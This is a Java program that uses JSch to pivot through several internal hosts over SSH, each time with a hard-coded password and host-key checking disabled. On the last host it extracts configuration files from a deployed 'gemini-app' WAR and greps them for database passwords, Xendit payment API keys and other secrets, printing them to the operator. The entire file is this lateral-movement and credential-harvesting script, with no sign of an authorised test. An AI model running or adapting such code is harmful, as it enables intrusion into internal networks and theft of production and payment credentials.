import com.jcraft.jsch.*;
import java.io.*;
class DFJ {
  public static void main(String[] a) throws Exception {
    JSch j = new JSch();
    java.util.Properties p = new java.util.Properties();
    p.put("StrictHostKeyChecking", "no");
    Session s1 = j.getSession("user", "10.14.36.23", 22);
    s1.setPassword("kutul0nc4t");
    s1.setConfig(p);
    s1.setTimeout(10000);
    s1.connect();
    int fwd1 = s1.setPortForwardingL(0, "10.13.16.117", 22);
    Session s2 = j.getSession("user", "127.0.0.1", fwd1);
    s2.setPassword("kutul0nc4t");
    s2.setConfig(p);
    s2.setTimeout(8000);
    s2.connect();
    ChannelExec ch = (ChannelExec) s2.openChannel("exec");
    // Extract config from Gemini WAR
    ch.setCommand("sshpass -p kutul0nc4t ssh -o StrictHostKeyChecking=no user@10.13.16.252 'cd /tmp;/usr/lib/jvm/java-17-amazon-corretto/bin/jar tf /progs/gemini/gemini-app/tomcat/10.1.17/webapps/gemini/gemini-app.war 2>/dev/null | grep -E \"properties$|yml$\" | head -10;echo ---EXTRACT---;/usr/lib/jvm/java-17-amazon-corretto/bin/jar xf /progs/gemini/gemini-app/tomcat/10.1.17/webapps/gemini/gemini-app.war BOOT-INF/classes/application.yml BOOT-INF/classes/application-prod.yml BOOT-INF/classes/application.properties BOOT-INF/classes/application-prod.properties WEB-INF/classes/config.properties WEB-INF/classes/config-prod.properties 2>/dev/null;echo ---SPRING-BOOT---;cat BOOT-INF/classes/application*.yml BOOT-INF/classes/application*.properties 2>/dev/null | grep -iE \"db\\.|pass|xendit|xnd_|api.key|secret|spring.datasource\" | head -15;echo ---LEGACY---;cat WEB-INF/classes/config*.properties 2>/dev/null | grep -iE \"db\\.|pass|xendit\" | head -10' 2>&1 | head -30");
    ch.setInputStream(null);
    InputStream in = ch.getInputStream();
    ch.connect();
    byte[] buf = new byte[16384];
    int i;
    while ((i = in.read(buf)) != -1) System.out.write(buf, 0, i);
    ch.disconnect();
    s2.disconnect();
    s1.disconnect();
  }
}
